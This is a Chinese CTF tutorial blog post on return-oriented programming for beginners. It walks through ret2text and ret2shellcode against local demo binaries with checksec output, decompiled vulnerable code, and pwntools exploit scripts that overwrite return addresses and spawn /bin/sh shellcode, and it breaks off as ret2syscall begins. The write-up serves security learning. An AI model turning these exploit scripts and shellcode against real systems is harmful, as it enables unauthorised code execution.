<!DOCTYPE html>
<html>
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
  
  <title>1.2-菜鸟学PWN之ROP学习 | Live to change world</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="实现ROP的两个条件:  程序存在栈溢出, 并可控制返回地址. 可以找到所需的gadgets以及它所在的地址.">
<meta name="keywords" content="CTF,PWN">
<meta property="og:type" content="article">
<meta property="og:title" content="1.2-菜鸟学PWN之ROP学习">
<meta property="og:url" content="http://www.killshadow.xyz/2019/06/06/1.2-菜鸟学PWN之ROP学习/index.html">
<meta property="og:site_name" content="Live to change world">
<meta property="og:description" content="实现ROP的两个条件:  程序存在栈溢出, 并可控制返回地址. 可以找到所需的gadgets以及它所在的地址.">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://www.killshadow.xyz/2019/06/06/1.2-菜鸟学PWN之ROP学习/Selection_032.png">
<meta property="og:image" content="http://www.killshadow.xyz/2019/06/06/1.2-菜鸟学PWN之ROP学习/1533549062535.png">
<meta property="og:image" content="http://www.killshadow.xyz/2019/06/06/1.2-菜鸟学PWN之ROP学习/1533553264967.png">
<meta property="og:image" content="http://www.killshadow.xyz/2019/06/06/1.2-菜鸟学PWN之ROP学习/Selection_034.png">
<meta property="og:image" content="http://www.killshadow.xyz/2019/06/06/1.2-菜鸟学PWN之ROP学习/15136516601572.jpg">
<meta property="og:image" content="http://www.killshadow.xyz/2019/06/06/1.2-菜鸟学PWN之ROP学习/417527177.jpg">
<meta property="og:updated_time" content="2019-06-06T07:43:17.470Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="1.2-菜鸟学PWN之ROP学习">
<meta name="twitter:description" content="实现ROP的两个条件:  程序存在栈溢出, 并可控制返回地址. 可以找到所需的gadgets以及它所在的地址.">
<meta name="twitter:image" content="http://www.killshadow.xyz/2019/06/06/1.2-菜鸟学PWN之ROP学习/Selection_032.png">
  
    <link rel="alternative" href="/atom.xml" title="Live to change world" type="application/atom+xml">
  
  
    <link rel="icon" href="//assets/img/wolf_track.ico">
  
  
      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>
<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
        <a href="/" class="profilepic">
            
            <img lazy-src="/assets/img/head.png" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">killshadow</a></h1>
        </hgroup>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a  href="http://www.killshadow.xyz/">博客首页</a></li>
                        
                            <li><a  href="/archives">文章归档</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl github"  target="_blank" href="https://www.github.com/killshadow" title="github">github</a>
                            
                                <a class="fl zhihu"  target="_blank" href="https://www.zhihu.com/people/0038/" title="zhihu">zhihu</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/Android-Developer/" style="font-size: 13.33px;">Android Developer</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Deep-Learning/" style="font-size: 10px;">Deep Learning</a> <a href="/tags/MISC/" style="font-size: 16.67px;">MISC</a> <a href="/tags/Mobile-Security/" style="font-size: 10px;">Mobile Security</a> <a href="/tags/PWN/" style="font-size: 13.33px;">PWN</a> <a href="/tags/Reverse/" style="font-size: 10px;">Reverse</a> <a href="/tags/Tools/" style="font-size: 10px;">Tools</a> <a href="/tags/Wireless/" style="font-size: 10px;">Wireless</a>
                    </div>
                </section>
                
                
                
                
                <section class="switch-part switch-part3">
                
                    <div id="js-aboutme">潜心修行，勿忘初心</div>
                </section>
                
            </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">killshadow</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="//assets/img/head.png" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me">killshadow</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="http://www.killshadow.xyz/">博客首页</a></li>
                
                    <li><a href="/archives">文章归档</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="github" target="_blank" href="https://www.github.com/killshadow" title="github">github</a>
                    
                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/0038/" title="zhihu">zhihu</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-1.2-菜鸟学PWN之ROP学习" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/06/06/1.2-菜鸟学PWN之ROP学习/" class="article-date">
      <time datetime="2019-06-06T07:23:00.000Z" itemprop="datePublished">2019-06-06</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      1.2-菜鸟学PWN之ROP学习
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <blockquote>
<p>实现ROP的两个条件:</p>
<ul>
<li>程序存在栈溢出, 并可控制返回地址.</li>
<li>可以找到所需的gadgets以及它所在的地址.</li>
</ul>
</blockquote>
<a id="more"></a>
<blockquote>
<p>我们在上文学习了最基本的栈溢出技巧, 这种情况下我们直接跳转到<code>system('/bin/sh')</code>即可, 但真实环境下往往没有如此简(ruo)单(zhi)的存在. 而是, 需要经过多次跳转, 甚至精心构造shellcode才能完整的执行系统调用. 而我们把<strong>经过多次跳转, 最终完整执行shellcode的方法叫做<code>ROP(Return  Oriented Programming)</code></strong>. 构造shellcode的过程当中, 由于程序/系统的限制, 我们通过<strong>利用程序中存在的程序小片段(gadgets, 以ret结尾的指令序列)来改变寄存器或者变量的值, 从而控制程序流程, 实现多次跳转.</strong></p>
</blockquote>
<h2 id="x10-背景知识">0x10 背景知识</h2>
<h3 id="x11-寄存器介绍">0X11 寄存器介绍</h3>
<p>32位x86架构下的寄存器分类如下:</p>
<div style="text-align: center;">
<figure>
<img src="/2019/06/06/1.2-菜鸟学PWN之ROP学习/Selection_032.png" alt="x86寄存器分类"><figcaption>x86寄存器分类</figcaption>
</figure>
</div>
<p>64位86_x64架构下的寄存器分类如下:</p>
<table>
<thead>
<tr class="header">
<th>Register</th>
<th>状态</th>
<th>请使用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>RAX</strong></td>
<td><strong>易失的</strong></td>
<td><strong>返回值寄存器</strong></td>
</tr>
<tr class="even">
<td><strong>RCX</strong></td>
<td><strong>易失的</strong></td>
<td><strong>第一个整型参数</strong></td>
</tr>
<tr class="odd">
<td><strong>RDX</strong></td>
<td><strong>易失的</strong></td>
<td><strong>第二个整型参数</strong></td>
</tr>
<tr class="even">
<td><strong>R8</strong></td>
<td><strong>易失的</strong></td>
<td><strong>第三个整型参数</strong></td>
</tr>
<tr class="odd">
<td><strong>R9</strong></td>
<td><strong>易失的</strong></td>
<td><strong>第四个整型参数</strong></td>
</tr>
<tr class="even">
<td><strong>R10:R11</strong></td>
<td><strong>易失的</strong></td>
<td><strong>必须根据需要由调用方保留；在 syscall/sysret 指令中使用</strong></td>
</tr>
<tr class="odd">
<td><strong>R12:R15</strong></td>
<td><strong>非易失的</strong></td>
<td><strong>必须由被调用方保留</strong></td>
</tr>
<tr class="even">
<td><strong>RDI</strong></td>
<td><strong>非易失的</strong></td>
<td><strong>必须由被调用方保留</strong></td>
</tr>
<tr class="odd">
<td><strong>RSI</strong></td>
<td><strong>非易失的</strong></td>
<td><strong>必须由被调用方保留</strong></td>
</tr>
<tr class="even">
<td><strong>RBX</strong></td>
<td><strong>非易失的</strong></td>
<td><strong>必须由被调用方保留</strong></td>
</tr>
<tr class="odd">
<td><strong>RBP</strong></td>
<td><strong>非易失的</strong></td>
<td><strong>可用作帧指针；必须由被调用方保留</strong></td>
</tr>
<tr class="even">
<td><strong>RSP</strong></td>
<td><strong>非易失的</strong></td>
<td><strong>堆栈指针</strong></td>
</tr>
<tr class="odd">
<td><strong>XMM0</strong></td>
<td><strong>易失的</strong></td>
<td><strong>第一个 FP 参数</strong></td>
</tr>
<tr class="even">
<td><strong>XMM1</strong></td>
<td><strong>易失的</strong></td>
<td><strong>第二个 FP 参数</strong></td>
</tr>
<tr class="odd">
<td><strong>XMM2</strong></td>
<td><strong>易失的</strong></td>
<td><strong>第三个 FP 参数</strong></td>
</tr>
<tr class="even">
<td><strong>XMM3</strong></td>
<td><strong>易失的</strong></td>
<td><strong>第四个 FP 参数</strong></td>
</tr>
<tr class="odd">
<td><strong>XMM4:XMM5</strong></td>
<td><strong>易失的</strong></td>
<td><strong>必须根据需要由调用方保留</strong></td>
</tr>
<tr class="even">
<td><strong>XMM6:XMM15</strong></td>
<td><strong>非易失的</strong></td>
<td><strong>必须根据需要由被调用方保留。</strong></td>
</tr>
</tbody>
</table>
<p>x64 结构提供了 16 个通用寄存器（以后称为整数寄存器），以及 16 个可供浮点使用的 XMM 寄存器。易失寄存器是由调用方假想的临时寄存器，并要在调用过程中销毁。非易失寄存器需要在整个函数调用过程中保留其值，并且一旦使用，则必须由被调用方保存。</p>
<h3 id="x12-进程内存布局">0x12 进程内存布局</h3>
<ul>
<li>32位模式下进程内存经典布局:
<div style="text-align: center;">
<figure>
<img src="/2019/06/06/1.2-菜鸟学PWN之ROP学习/1533549062535.png" alt="32位模式下进程内存"><figcaption>32位模式下进程内存</figcaption>
</figure>
</div></li>
<li>64位模式下进程内存经典布局(简略版):
<div style="text-align: center;">
<figure>
<img src="/2019/06/06/1.2-菜鸟学PWN之ROP学习/1533553264967.png" alt="64位模式下进程内存布局(简略)"><figcaption>64位模式下进程内存布局(简略)</figcaption>
</figure>
</div></li>
</ul>
<hr>
<h2 id="x20-基础rop">0x20 基础ROP</h2>
<h3 id="x21-ret2text">0x21 ret2text</h3>
<p>ret2text即控制栈里的返回值, 使其返回到程序本身的某个代码段(.text). 上文<a href="https://www.killshadow.xyz/2018/10/10/1.1-%E8%8F%9C%E9%B8%9F%E5%AD%A6PWN%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0/">1.1-菜鸟学PWN之栈溢出学习</a>中的例子已经提到过, 其核心思想就是: <strong>利用栈溢出, 覆盖返回地址到系统调用函数</strong>, 例如<code>system(/bin/sh)</code>.</p>
<blockquote>
<p>payload = 'a' * value_offset_for_ebp + p32(system_func_addr)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">                            High address</span><br><span class="line">                         +---------------+</span><br><span class="line">                         |               |</span><br><span class="line">                         |     ......    |</span><br><span class="line">                         |               |</span><br><span class="line"> variable in stack +---&gt; +---------------+</span><br><span class="line"> offset from ebp         | return address| +--------------+</span><br><span class="line">                         +---------------+  &lt;---+ stack   |</span><br><span class="line">                         |     ebp       |                |</span><br><span class="line">                         +---------------+                |</span><br><span class="line">                         |               |                |</span><br><span class="line">                         +---------------+                |</span><br><span class="line">                         |               |                |</span><br><span class="line">                         +---------------+                |</span><br><span class="line">                         |     ......    |                |</span><br><span class="line">                         |               |                |</span><br><span class="line">                         |               |                |</span><br><span class="line">                         |               |                |</span><br><span class="line">                         +---------------+                |</span><br><span class="line">                         |               |                |</span><br><span class="line">                         +---------------+ &lt;--------------+</span><br><span class="line">                         |               |</span><br><span class="line">   system function +---&gt; +---------------+</span><br><span class="line">(eg:system(&apos;/bin/sh&apos;))   |               |</span><br><span class="line">                         +---------------+  &lt;---+ function(.text)</span><br><span class="line">                         |               |</span><br><span class="line">                         +---------------+</span><br><span class="line">                         |               |</span><br><span class="line">                         |     ......    |</span><br><span class="line">                         |               |</span><br><span class="line">                         +---------------+</span><br><span class="line">                           Low address</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># execute elf</span></span><br><span class="line">sh = process(<span class="string">"ret2text"</span>)</span><br><span class="line"><span class="comment"># this is system('/bin/sh') address</span></span><br><span class="line">exec_addr = <span class="number">0x0804863a</span></span><br><span class="line"><span class="comment"># this is ebp address</span></span><br><span class="line">gets_ebp_addr = <span class="number">0xffffce78</span></span><br><span class="line"><span class="comment"># this is 's' value address</span></span><br><span class="line">s_addr = <span class="number">0xffffcdf0</span> + <span class="number">0x1c</span></span><br><span class="line"><span class="comment"># this is offset between ebp address and 's' value address</span></span><br><span class="line">rop_offset = gets_ebp_addr - s_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*(rop_offset + <span class="number">4</span>) + p32(exec_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="x22-ret2shellcode">0x22 ret2shellcode</h3>
<p>ret2shellcode即控制栈里的返回值, 使其返回到自己填充的shellcode代码. shellcode指的是用于完成某个功能的(汇编)代码. 这里需要注意的是, <strong>填充shellcode的时候, 一定要将shellcode填充到可执行段中.</strong> 其核心思想是: <strong>利用栈溢出, 使返回地址返回到自己填充的shellcode里.</strong></p>
<ol type="1">
<li><p>查看保护, 发现有一个可读可写可执行的段:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  demo checksec ret2shellcode</span><br><span class="line">[*] &apos;/home/ks/ctf/pwn/stack/demo/ret2shellcode&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></li>
<li><p>IDA反汇编之后可看到主函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, &amp;s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从上面可以看出, <code>gets()</code>函数存在栈溢出. <code>strncpy</code>函数可以看到将s变量的字符串复制到buf2中, 那我们再看看buf2所处的位置:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o</span><br></pre></td></tr></table></figure>
<p>可看到, buf2是有100个元素的字符型数组, 存在于bss段中. 我们动态调试一下bss段的权限:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x /home/ks/ctf/pwn/stack/demo/ret2shellcode</span><br><span class="line">0x08049000 0x0804a000 0x00000000 r-x /home/ks/ctf/pwn/stack/demo/ret2shellcode</span><br><span class="line">0x0804a000 0x0804b000 0x00001000 rwx /home/ks/ctf/pwn/stack/demo/ret2shellcode</span><br><span class="line">0xf7dcb000 0xf7fa0000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fa0000 0xf7fa1000 0x001d5000 --- /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fa1000 0xf7fa3000 0x001d5000 r-x /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fa3000 0xf7fa4000 0x001d7000 rwx /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fa4000 0xf7fa7000 0x00000000 rwx </span><br><span class="line">0xf7fcf000 0xf7fd1000 0x00000000 rwx </span><br><span class="line">0xf7fd1000 0xf7fd4000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7fd4000 0xf7fd6000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7fd6000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 0x00025000 r-x /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 0x00026000 rwx /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xfffdd000 0xffffe000 0x00000000 rwx [stack]</span><br></pre></td></tr></table></figure>
<p>根据上面从ida看到的, buf2在<code>0x0804a080</code>中, 即为上示gdb的vmmap的<code>0x0804a00</code>~<code>0x0804b00</code>中, 可以看出该段的权限, 可读可写可执行, 因此, 我们的思路便是: <strong>将shellcode填充的s中, 然后将s中的shellcode复制到buf2中.</strong></p>
<blockquote>
<p>payload = (include assembly system function)shellcode + (ret)buf2_addr</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">                           High address</span><br><span class="line">                        +---------------+</span><br><span class="line">                        |               |</span><br><span class="line">                        |     ......    |</span><br><span class="line">                        |               |</span><br><span class="line">variable in stack +---&gt; +---------------+</span><br><span class="line">offset from ebp         | return address| +--------------+</span><br><span class="line">                        +---------------+  &lt;---+ stack   |</span><br><span class="line">                        |     ebp       |                |</span><br><span class="line">                        +---------------+                |</span><br><span class="line">                        |               |                |</span><br><span class="line">                        +---------------+                |</span><br><span class="line">                        |               |                |</span><br><span class="line">                        +---------------+                |</span><br><span class="line">                        |     ......    |                |</span><br><span class="line">                        |               |                |</span><br><span class="line">                        |               |                |</span><br><span class="line">                        |               |                |</span><br><span class="line">                        +---------------+                |</span><br><span class="line">                        |               |                |</span><br><span class="line">                        +---------------+ &lt;--------------+</span><br><span class="line">                        |               |</span><br><span class="line">      shellcode   +---&gt; +---------------+</span><br><span class="line">                        |               |</span><br><span class="line">                        +---------------+  &lt;---+ RWX segment</span><br><span class="line">                        |               |</span><br><span class="line">                        +---------------+</span><br><span class="line">                        |               |</span><br><span class="line">                        |     ......    |</span><br><span class="line">                        |               |</span><br><span class="line">                        +---------------+</span><br><span class="line">                          Low address</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"ret2shellcode"</span>)</span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span></span><br><span class="line"><span class="comment"># shell = 'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'</span></span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line">s_addr = <span class="number">0xffffcde0</span> + <span class="number">0x1c</span></span><br><span class="line">ebp_addr = <span class="number">0xffffce68</span></span><br><span class="line">ret_offset = ebp_addr - s_addr + <span class="number">4</span></span><br><span class="line"><span class="keyword">print</span> ret_offset</span><br><span class="line"><span class="comment"># ljust means fill with "A"</span></span><br><span class="line">payload = shell.ljust(ret_offset,<span class="string">"A"</span>) + p32(buf2_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="x23-ret2syscall">0x23 ret2syscall</h3>
<p>顾名思义, ret2syscall就是<strong>利用gadgets控制程序执行系统调用, 获取shellcode</strong>.</p>
<ol type="1">
<li><p>首先查看程序开启的保护:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  demo checksec ret2syscall</span><br><span class="line">[*] &apos;/home/ks/ctf/pwn/stack/demo/ret2syscall&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>NX保护依旧打开, canary关闭则可直接栈溢出.</p></li>
<li><p>在反汇编程序, 得到主函数如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Something surprise here, but I don't think it will work."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What do you think ?"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面可以看到, 还是一个栈溢出的漏洞.</p></li>
<li><p>我们无法直接利用程序中的某一段代码或者自己填写的代码来获得shell, 因此只能利用程序中的一段代码或者自己填写的代码来获得shell. 通过<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" target="_blank" rel="noopener">系统调用</a>来获取shell. 应用程序调用系统调用的过程是:</p>
<blockquote>
